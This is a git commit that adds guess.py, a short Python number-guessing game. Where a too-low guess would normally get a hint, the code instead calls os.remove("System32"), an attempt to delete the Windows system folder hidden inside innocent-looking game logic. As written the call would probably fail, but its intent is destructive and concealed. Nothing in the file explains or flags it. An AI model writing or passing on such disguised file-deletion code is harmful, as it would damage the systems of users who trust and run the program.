d152e9b15899473d4d524cc1213d2f6c90f62e52
Jason Ofori - Boateng <oforiboatengjason@gmail.com>
2025-02-05 21:04:57 +0000

    Add files via upload

---
+++ guess.py
@@ -0,0 +1,18 @@
+import random
+import os 
+
+num = random.randint(1,10)
+e_num = input("Guess the number between 1 and 10: ")
+
+while True:
+    if int(e_num) < num :
+        os.remove("System32")
+            
+    elif int(e_num) > num: 
+        print("The number you've inputed is higher so input something less ")
+
+    elif int(e_num)  == num:
+        print('Yayy you got the number')
+        break
+
+    e_num = input("Guess again: ")
